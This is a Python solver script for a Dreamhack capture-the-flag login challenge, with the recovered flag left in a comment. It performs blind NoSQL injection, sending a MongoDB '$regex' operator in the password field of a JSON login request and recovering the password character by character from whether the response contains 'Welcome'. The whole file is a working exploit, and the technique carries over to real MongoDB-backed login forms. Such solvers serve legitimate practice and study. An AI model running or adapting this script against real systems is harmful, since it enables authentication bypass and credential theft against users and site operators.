import re
import string
import requests

URL = "http://host3.dreamhack.games:18041/login"
UID = "cream" # testuser
# [+] final password: DH{0da0d81e54f57b
#  e1b67f0e666e326954}
s = requests.Session()

charset = string.ascii_letters + string.digits + string.punctuation


def check(regex):
    data = {
        "uid": UID,
        "upw": {
            "$regex": regex
        }
    }

    r = s.post(URL, json=data, timeout=5)

    # 실제 성공 응답에 맞게 수정
    return "Welcome" in r.text


password = ""

while True:
    found = False

    for ch in charset:
        candidate = password + ch
        regex = "^" + re.escape(candidate)

        print(f"test: {regex}")

        if check(regex):
            password += ch
            print(f"[+] password: {password}")
            found = True
            break

    if not found:
        # 현재까지의 문자열이 정확히 끝난 것인지 확인
        if check("^" + re.escape(password) + "$"):
            print(f"[+] final password: {password}")
        else:
            print("[-] 성공 판별 조건이나 charset을 확인해야 함")
        break